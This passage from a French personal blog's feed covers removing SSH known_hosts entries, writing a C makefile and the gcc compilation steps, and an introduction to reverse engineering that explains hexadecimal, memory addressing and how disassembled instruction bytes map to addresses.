&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# supprimer une entrée&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ssh-keygen &lt;span class=&quot;nt&quot;&gt;-R&lt;/span&gt; mon-super-site.fr
&lt;span class=&quot;c&quot;&gt;# ou&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ssh-keygen &lt;span class=&quot;nt&quot;&gt;-R&lt;/span&gt; 10.10.10.10

&lt;span class=&quot;c&quot;&gt;# -R  -- remove host from known_hosts file&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
</content>
 </entry>
 
 <entry>
   <title>makefile</title>
   <link href="http://localhost:4000/linux/2018/05/09/makefile/"/>
   <updated>2018-05-09T00:00:00+02:00</updated>
   <id>http://localhost:4000/linux/2018/05/09/makefile</id>
   <content type="html">&lt;!--more--&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;makefile&quot;&gt;makefile&lt;/h2&gt;
&lt;hr /&gt;

&lt;div class=&quot;language-makefile highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;CC&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;gcc
&lt;span class=&quot;nv&quot;&gt;CFLAGS&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-W&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Wall&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-ansi&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-pedantic&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;LDFLAGS&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;EXEC&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;bonjour

&lt;span class=&quot;nl&quot;&gt;all&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;$(EXEC)&lt;/span&gt;

&lt;span class=&quot;nl&quot;&gt;bonjour&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;bonjour.o main.o&lt;/span&gt;
	&lt;span class=&quot;c&quot;&gt;## &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$(CC)&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$(EXEC)&lt;/span&gt; bonjour.o main.o &lt;span class=&quot;nv&quot;&gt;$(LDFLAGS)&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;##&lt;/span&gt;
	&lt;span class=&quot;nv&quot;&gt;$(CC)&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$@&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$^&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$(LDFLAGS)&lt;/span&gt;

&lt;span class=&quot;nl&quot;&gt;bonjour.o&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;bonjour.c&lt;/span&gt;
	&lt;span class=&quot;c&quot;&gt;## &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$(CC)&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; bonjour.o &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; bonjour.c &lt;span class=&quot;nv&quot;&gt;$(CFLAGS)&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;##&lt;/span&gt;
	&lt;span class=&quot;nv&quot;&gt;$(CC)&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$@&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$&amp;lt;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$(CFLAGS)&lt;/span&gt;

&lt;span class=&quot;nl&quot;&gt;main.o&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main.c bonjour.h&lt;/span&gt;
	&lt;span class=&quot;c&quot;&gt;## &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$(CC)&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; main.o &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; main.c &lt;span class=&quot;nv&quot;&gt;$(CFLAGS)&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;##&lt;/span&gt;
	&lt;span class=&quot;nv&quot;&gt;$(CC)&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$@&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$&amp;lt;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$(CFLAGS)&lt;/span&gt;

&lt;span class=&quot;nl&quot;&gt;clean&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;
	&lt;span class=&quot;nb&quot;&gt;rm&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-rf&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.o

&lt;span class=&quot;nl&quot;&gt;veryclean&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;clean&lt;/span&gt;
	&lt;span class=&quot;nb&quot;&gt;rm&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-rf&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$(EXEC)&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# $@ -&amp;gt; nom de la cible (avant les :)
# $&amp;lt; -&amp;gt; nom de la premiére dependance (juste apres les :)
# $^ -&amp;gt; liste des dependances (tout ce qu'il y a aprés les :)
# $? -&amp;gt; dependances plus récentes que la cible
# $* -&amp;gt; nom du fichier sans le suffixe
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;compilation-steps&quot;&gt;compilation steps&lt;/h2&gt;
&lt;hr /&gt;

&lt;h4 id=&quot;pre-processing&quot;&gt;pre-processing&lt;/h4&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# supprime commentaires&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# traite les directives (#include)&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;gcc &lt;span class=&quot;nt&quot;&gt;-E&lt;/span&gt; main.cpp &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; main.i
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;compiling&quot;&gt;compiling&lt;/h4&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# passage en assembleur&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;gcc &lt;span class=&quot;nt&quot;&gt;-S&lt;/span&gt; main.i &lt;span class=&quot;c&quot;&gt;# -&amp;gt; main.s&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;assembling&quot;&gt;assembling&lt;/h4&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# assembleur en binaire (.object)&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;gcc &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; main.s
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;linking&quot;&gt;linking&lt;/h4&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# fusion des fichiers&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;gcc main.o outils.o &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; a.out
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
</content>
 </entry>
 
 <entry>
   <title>reverse intro</title>
   <link href="http://localhost:4000/reverse/2018/05/02/reverse-intro/"/>
   <updated>2018-05-02T00:00:00+02:00</updated>
   <id>http://localhost:4000/reverse/2018/05/02/reverse-intro</id>
   <content type="html">&lt;!--more--&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;hexadecimal&quot;&gt;hexadecimal&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;Le système hexadecimal utilise une base 16. C’est à dire que chaque caractère peut prendre 16 valeurs différentes.&lt;/p&gt;

&lt;table&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;base 10&lt;/td&gt;
      &lt;td&gt;0&lt;/td&gt;
      &lt;td&gt;1&lt;/td&gt;
      &lt;td&gt;2&lt;/td&gt;
      &lt;td&gt;3&lt;/td&gt;
      &lt;td&gt;4&lt;/td&gt;
      &lt;td&gt;5&lt;/td&gt;
      &lt;td&gt;6&lt;/td&gt;
      &lt;td&gt;7&lt;/td&gt;
      &lt;td&gt;8&lt;/td&gt;
      &lt;td&gt;9&lt;/td&gt;
      &lt;td&gt;10&lt;/td&gt;
      &lt;td&gt;11&lt;/td&gt;
      &lt;td&gt;12&lt;/td&gt;
      &lt;td&gt;13&lt;/td&gt;
      &lt;td&gt;14&lt;/td&gt;
      &lt;td&gt;15&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;base 16&lt;/td&gt;
      &lt;td&gt;0&lt;/td&gt;
      &lt;td&gt;1&lt;/td&gt;
      &lt;td&gt;2&lt;/td&gt;
      &lt;td&gt;3&lt;/td&gt;
      &lt;td&gt;4&lt;/td&gt;
      &lt;td&gt;5&lt;/td&gt;
      &lt;td&gt;6&lt;/td&gt;
      &lt;td&gt;7&lt;/td&gt;
      &lt;td&gt;8&lt;/td&gt;
      &lt;td&gt;9&lt;/td&gt;
      &lt;td&gt;a&lt;/td&gt;
      &lt;td&gt;b&lt;/td&gt;
      &lt;td&gt;c&lt;/td&gt;
      &lt;td&gt;d&lt;/td&gt;
      &lt;td&gt;e&lt;/td&gt;
      &lt;td&gt;f&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;On préfixe les nombres hexadécimals souvent par un &lt;code class=&quot;highlighter-rouge&quot;&gt;Ox&lt;/code&gt; afin de les différencier des autres bases.&lt;/p&gt;

&lt;table&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;base 10&lt;/td&gt;
      &lt;td&gt;8&lt;/td&gt;
      &lt;td&gt;20&lt;/td&gt;
      &lt;td&gt;29&lt;/td&gt;
      &lt;td&gt;32&lt;/td&gt;
      &lt;td&gt;74&lt;/td&gt;
      &lt;td&gt;90&lt;/td&gt;
      &lt;td&gt;100&lt;/td&gt;
      &lt;td&gt;999&lt;/td&gt;
      &lt;td&gt;1000&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;base 16&lt;/td&gt;
      &lt;td&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;0x8&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;0x14&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;0x1d&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;0x20&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;0x4a&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;0x5a&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;0x64&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;0x3e7&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;0x3e8&lt;/code&gt;&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h4 id=&quot;base-10-to-base-16&quot;&gt;base 10 to base 16&lt;/h4&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;….&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;16&lt;sup&gt;3&lt;/sup&gt;&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;16&lt;sup&gt;2&lt;/sup&gt;&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;16&lt;sup&gt;1&lt;/sup&gt;&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;16&lt;sup&gt;0&lt;/sup&gt;&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;….&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;4096&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;256&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;16&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;1&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;….&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;0&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;3&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;14&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;7&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;(999)&lt;sub&gt;10&lt;/sub&gt; = 3 * 256 + 14 * 16 + 7 * 1&lt;br /&gt;
(999)&lt;sub&gt;10&lt;/sub&gt; = 3 * 16&lt;sup&gt;2&lt;/sup&gt; + 14 * 16&lt;sup&gt;1&lt;/sup&gt; + 7 * 16&lt;sup&gt;0&lt;/sup&gt;&lt;br /&gt;
(999)&lt;sub&gt;10&lt;/sub&gt; = &lt;code class=&quot;highlighter-rouge&quot;&gt;3&lt;/code&gt; * 16&lt;sup&gt;2&lt;/sup&gt; + &lt;code class=&quot;highlighter-rouge&quot;&gt;E&lt;/code&gt; * 16&lt;sup&gt;1&lt;/sup&gt; + &lt;code class=&quot;highlighter-rouge&quot;&gt;7&lt;/code&gt; * 16&lt;sup&gt;0&lt;/sup&gt;&lt;br /&gt;
(999)&lt;sub&gt;10&lt;/sub&gt; = (&lt;code class=&quot;highlighter-rouge&quot;&gt;0x3E7&lt;/code&gt;)&lt;sub&gt;16&lt;/sub&gt;&lt;/p&gt;

&lt;h4 id=&quot;memory-space&quot;&gt;memory space&lt;/h4&gt;

&lt;p&gt;Combien de bits pour coder un caractère en base 16 ?&lt;br /&gt;
Chaque caractére peut prendre 16 valeurs :&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;1 bit -&amp;gt; 2&lt;sup&gt;1&lt;/sup&gt; = 2 combinaisons&lt;/li&gt;
  &lt;li&gt;2 bits -&amp;gt; 2&lt;sup&gt;2&lt;/sup&gt; = 4 combinaisons&lt;/li&gt;
  &lt;li&gt;3 bits -&amp;gt; 2&lt;sup&gt;3&lt;/sup&gt; = 8 combinaisons&lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;4 bits -&amp;gt; 2&lt;sup&gt;4&lt;/sup&gt; = 16 combinaisons &amp;lt;– Donc 1 caractère occupe 4 bits.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;0x8&lt;/code&gt; -&amp;gt; occupe 4 bits&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;0x4A&lt;/code&gt; -&amp;gt; occupe 8 bits -&amp;gt; 1 octet&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;0x4A88&lt;/code&gt; -&amp;gt; occupe 16 bits -&amp;gt; 2 octets&lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;memory-addressing&quot;&gt;memory addressing&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;On utilise souvent la base hexadécimale pour donner des adresses mémoires. Par exemple &lt;code class=&quot;highlighter-rouge&quot;&gt;0x000008ff&lt;/code&gt; est une adresse mémoire sur une machine 32 bits.&lt;/p&gt;

&lt;p&gt;Les machines 32 bits ont 32 bits d’adressage (ou 4 octets), c’est à dire que l’on peut localiser 2&lt;sup&gt;32&lt;/sup&gt; blocs de 1 octet dans la RAM. C’est à dire 4 Go maximum.&lt;/p&gt;

&lt;p&gt;Les processeurs 64 bits quand à eux peuvent adresser 2&lt;sup&gt;64&lt;/sup&gt; blocs différents. C’est à dire BEAUCOUP !&lt;/p&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;assembler-asm&quot;&gt;assembler (asm)&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;Voici un exemple de code écrit en langage C :&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cm&quot;&gt;/* main.cpp */&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;arc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[])&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nb1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nb2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nb1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nb2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%i est plus grand que %i&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nb1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nb2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%i est plus petit que %i&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nb1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nb2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Le processeur d’un ordinateur ne peut réaliser que de simples opérations (additions, soustractions, comparaison à 0,…). Il ne peut donc pas directement interpréter notre &lt;code class=&quot;highlighter-rouge&quot;&gt;main.cpp&lt;/code&gt;. C’est pour cela que l’on passe par une phase de compilation qui nous permet d’obtenir un exécutable compréhensible par notre processeur.&lt;/p&gt;

&lt;h4 id=&quot;example&quot;&gt;example&lt;/h4&gt;

&lt;pre&gt;&lt;code class=&quot;language-assembler&quot;&gt;0x000008d6      83f80a         cmp eax, 0xa
0x000008d9      7513           jne 0x8ee
0x000008db      488d3d430100.  lea rdi, qword str.Gagne
0x000008e2      b800000000     mov eax, 0
0x000008e7      e834feffff     call sym.imp.printf
0x000008ec      eb11           jmp 0x8ff
0x000008ee      488d3d440100.  lea rdi, qword str.Perdu
0x000008f5      b800000000     mov eax, 0
0x000008fa      e821feffff     call sym.imp.printf
0x000008ff      b800000000     mov eax, 0
0x00000904      c9             leave
0x00000905      c3             ret
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;La colonne de gauche représente les adresses mémoires (on reconnait la base hexadécimale &lt;code class=&quot;highlighter-rouge&quot;&gt;0x...&lt;/code&gt;), la seconde est le contenu mémoire (données stockées) jusqu’à la prochaine adresse mémoire. Enfin, la troisième colonne est la traduction de ce contenu en langage assembleur. Par exemple, &lt;code class=&quot;highlighter-rouge&quot;&gt;eb11&lt;/code&gt; est traduit par l’instruction &lt;code class=&quot;highlighter-rouge&quot;&gt;jmp 0x8ff&lt;/code&gt;.&lt;/p&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;addresses-evolution&quot;&gt;addresses evolution&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;Prenons par exemple les 4 premières lignes&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;adresse (hexa)&lt;/th&gt;
      &lt;th&gt;contenu (hexa)&lt;/th&gt;
      &lt;th&gt;directive (assembleur)&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;0x000008d6&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;83f80a&lt;/td&gt;
      &lt;td&gt;cmp eax, 0xa&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;0x000008d9&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;7513&lt;/td&gt;
      &lt;td&gt;jne 0x8ee&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;0x000008db&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;488d3d430100&lt;/td&gt;
      &lt;td&gt;lea rdi, qword str.Gagne&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;0x000008e2&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;b800000000&lt;/td&gt;
      &lt;td&gt;mov eax, 0&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Rappel&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;un caractère hexadécimal occupe &lt;code class=&quot;highlighter-rouge&quot;&gt;4 bits&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;un case memoire fait 1 octet&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Pourquoi passe t-on de l’adresse &lt;code class=&quot;highlighter-rouge&quot;&gt;0x000008d6&lt;/code&gt; à &lt;code class=&quot;highlighter-rouge&quot;&gt;0x000008d9&lt;/code&gt; ?&lt;/p&gt;

&lt;p&gt;Tout d’abord l’adresse &lt;code class=&quot;highlighter-rouge&quot;&gt;0x000008d6&lt;/code&gt; pointe sur une suite de données correspondant à la directive &lt;code class=&quot;highlighter-rouge&quot;&gt;83f80a&lt;/code&gt;. Cette directive est une valeur hexadécimale qu’il faut stocker. Etant donné que &lt;code class=&quot;highlighter-rouge&quot;&gt;83f80a&lt;/code&gt; est composée de 6 caractéres hexa, il faut donc 3 octets pour stocker cette directive (6*4 = 24 bits = 3 octets).&lt;/p&gt;

&lt;p&gt;De plus si on regarde le delta de &lt;code class=&quot;highlighter-rouge&quot;&gt;0x000008d9&lt;/code&gt; - &lt;code class=&quot;highlighter-rouge&quot;&gt;0x000008d6&lt;/code&gt; on retouve la valeur 3. Tout s’explique.&lt;/p&gt;

&lt;p&gt;Voiçi un tableau avec le contenu de chaque case mémoire :&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;adresse (hexa)&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;directive (hexa)&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;0x000008d6&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;83&lt;/code&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;0x000008d7&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;f8&lt;/code&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;0x000008d8&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;0a&lt;/code&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;0x000008d9&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;75&lt;/code&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;0x000008da&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;13&lt;/code&gt;&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;registers&quot;&gt;registers&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;Important&lt;/strong&gt;: plus on est proche du processeur, plus la mémoire est rapide, plus vite sont exécutées les instructions.&lt;/p&gt;

